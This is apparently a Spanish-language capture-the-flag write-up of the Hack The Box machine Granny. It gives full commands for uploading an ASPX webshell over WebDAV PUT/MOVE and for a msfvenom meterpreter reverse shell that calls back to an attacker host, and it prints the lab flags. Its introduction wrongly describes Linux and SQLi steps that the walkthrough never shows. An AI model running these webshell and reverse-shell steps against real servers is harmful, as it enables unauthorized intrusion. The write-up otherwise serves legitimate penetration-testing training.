- ---
- Tags: #ejptmachine #aspx #bufferoverflow #curl
--- -
### ¿Qué habilidades puedes practicar con Granny?

1. **Reconocimiento y escaneo de puertos:**
    - Al igual que en la mayoría de las máquinas de Hack The Box, el primer paso es realizar un **escaneo de puertos** para identificar los servicios y puertos abiertos. Utilizando herramientas como **Nmap** podrás obtener una visión clara de los servicios disponibles, lo que te permitirá planificar tu ataque.
2. **Explotación de vulnerabilidades web:**
    - En **Granny**, uno de los principales vectores de ataque es una vulnerabilidad en una aplicación web. Deberás realizar un **reconocimiento web** exhaustivo para identificar posibles **vulnerabilidades** como **inyección SQL (SQLi)**, **cross-site scripting (XSS)**, o **autenticación débil**.
    - Este tipo de vulnerabilidad te permitirá obtener acceso al sistema o **obtener credenciales** que te ayuden en etapas posteriores del proceso.
3. **Escalada de privilegios en Linux:**
    - Una vez que consigas acceso inicial al sistema, tendrás que realizar una **escalada de privilegios** para obtener privilegios más altos en el sistema **Linux**. Buscarás **permisos incorrectos** en archivos importantes o configuraciones erróneas en servicios que puedan permitirte elevar tus privilegios.
    - También es común que se necesite **abuso de configuraciones de Sudo** o el aprovechamiento de **vulnerabilidades locales** para lograr la escalada.

---
La máquina **Granny** utiliza **Internet Information Services (IIS)** como servidor web, el cual soporta el procesamiento de archivos ASPX. Si el servidor tiene configuraciones inseguras o está desactualizado, puede ser explotado para cargar y ejecutar código malicioso.

Los archivos **ASPX** permiten ejecutar **código del lado del servidor**, lo que significa que puedes cargar un archivo malicioso diseñado para interactuar con el sistema operativo subyacente (Windows).

----

`nmap -sCV --min-rate 5000 -n 10.10.10.15`

![Pasted image 20241124214131](../../Fotos/Pasted%20image%2020241124214131.png)

`nmap -A 10.10.10.15`

![Pasted image 20241124220719](../../Fotos/Pasted%20image%2020241124220719.png)

![Pasted image 20241124214521](../../Fotos/Pasted%20image%2020241124214521.png)

`davtest -url http://10.10.10.15`
- Permite ver que tipo de archivos es posible cargar a la web.

![Pasted image 20241124222913](../../Fotos/Pasted%20image%2020241124222913.png)
----
`cp /usr/share/webshells/aspx/cmdasp.aspx .`
- Copiamos esta webshell y lo que haremos será cargarla a la web.

![Pasted image 20241124223124](../../Fotos/Pasted%20image%2020241124223124.png)

`curl -X PUT http://10.10.10.15/payload.txt -d @cmdasp.aspx`
- Hacemos que ela rchivo cmdasp.aspx lo cargamos con PUT al servidor web especificado y tendra el nombre payload.txt
Esto lo podemos hacer ya que recordemos lo que vimos con nmap:

![Pasted image 20241124223510](../../Fotos/Pasted%20image%2020241124223510.png)

![Pasted image 20241124223411](../../Fotos/Pasted%20image%2020241124223411.png)

 asi mismo podríamos solo haberlo cargado y cambiarlo el nombre en nuestra maquina es lo mismo.
Ejemplo:
`curl http://10.10.10.15/ --upload-file payload.txt`

----

![Pasted image 20241124223934](../../Fotos/Pasted%20image%2020241124223934.png)

Recordemos que para que la webshell funcione tenemos que ejecutarla en formato aspx cosa que la web no permite cargar, la idea es cargar la webshell como .txt y luego ya cargada como tenemos al acceso a MOVE.

![Pasted image 20241124223510](../../Fotos/Pasted%20image%2020241124223510.png)

Poder renombrarla estando ya cargada en la web.

Decimos que queremos  que quede como payload.aspx 

![Pasted image 20241124224522](../../Fotos/Pasted%20image%2020241124224522.png)

![Pasted image 20241124224646](../../Fotos/Pasted%20image%2020241124224646.png)

![Pasted image 20241124224658](../../Fotos/Pasted%20image%2020241124224658.png)

`Maquina vulnerada`

---

*Escalada privilegios*

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=443 -f aspx > exploit.aspx`

![Pasted image 20241124224912](../../Fotos/Pasted%20image%2020241124224912.png)

`curl -X PUT http://10.10.10.15/exploit.txt --data-binary @exploit.aspx`
`curl -X MOVE -H 'Destination:http://10.10.10.15/exploit.aspx' http://10.10.10.15/exploit.txt`

![Pasted image 20241124225120](../../Fotos/Pasted%20image%2020241124225120.png)

`msfconsole`
`use exploit/multi/handler`
`set payload windows/meterpreter/reverse_tcp`
`set LHOST ip interfaz`

![Pasted image 20241124225432](../../Fotos/Pasted%20image%2020241124225432.png)

`set LPORT 443`
- Todo debe concordar con el exploit creado con msfvenom y previamente cargado.

![Pasted image 20241124225849](../../Fotos/Pasted%20image%2020241124225849.png)

![Pasted image 20241124231406](../../Fotos/Pasted%20image%2020241124231406.png)

- Quedamos en escucha, entramos al archivo cargado en la web y tenemos la sesion de meterpreter

![Pasted image 20241124231707](../../Fotos/Pasted%20image%2020241124231707.png)

Abrimos otra ventana METASPLOIT

![Pasted image 20241124232302](../../Fotos/Pasted%20image%2020241124232302.png)

Refrescamos la pagina y tenemos otra sesión de meterpreter

![Pasted image 20241124232402](../../Fotos/Pasted%20image%2020241124232402.png)

![Pasted image 20241124232536](../../Fotos/Pasted%20image%2020241124232536.png)

![Pasted image 20241124232924](../../Fotos/Pasted%20image%2020241124232924.png)

![Pasted image 20241124232904](../../Fotos/Pasted%20image%2020241124232904.png)

Copiamos

![Pasted image 20241124233001](../../Fotos/Pasted%20image%2020241124233001.png)

![Pasted image 20241124233208](../../Fotos/Pasted%20image%2020241124233208.png)

![Pasted image 20241124233229](../../Fotos/Pasted%20image%2020241124233229.png)

*En esta sesión entramos con privilegios pudiendo leer la flag de root no como en la otra sesion que tenemos*

![Pasted image 20241124233325](../../Fotos/Pasted%20image%2020241124233325.png)

Root flag: aa4beed1c0584445ab463a6747bd06e9
User flag: 700c5dc163014e22b3e408f8703f67d1

----

- Preguntas

¿Qué marco de aplicación web basado en DOTNET se está ejecutando en el servidor web de destino?
Ispeccione los encabezados de respuesta del sitio. El encabezado X-Powered-By es útil en este caso.
`curl -I http://10.10.10.15`

![Pasted image 20241125141245](../../Fotos/Pasted%20image%2020241125141245.png)
- ASP.NET

---

- Preguntas
Ver el CVE con comandos locales otra manera
`nmap --script vulners -sV 10.10.10.15`

![Pasted image 20241125142528](../../Fotos/Pasted%20image%2020241125142528.png)
- Nos centramos en la puntuación de 9.0 a mas idealmente. En este caso ninguna es la correcta ya que la vuln es del 2017

La respuesta era : CVE-2017-7269 
Hubo que buscar en internet

----

- Preguntas

¿Qué módulo de reconocimiento de metasploit se puede utilizar para enumerar posibles rutas de escalada de privilegios en un sistema comprometido?

El módulo de reconocimiento en **Metasploit** que puede ser utilizado para listar posibles rutas de **escalada de privilegios** en un sistema comprometido es **`post/multi/recon/local_exploit_suggester`**. Este módulo examina el sistema comprometido en busca de vulnerabilidades que puedan ser explotadas para obtener privilegios elevados.

----

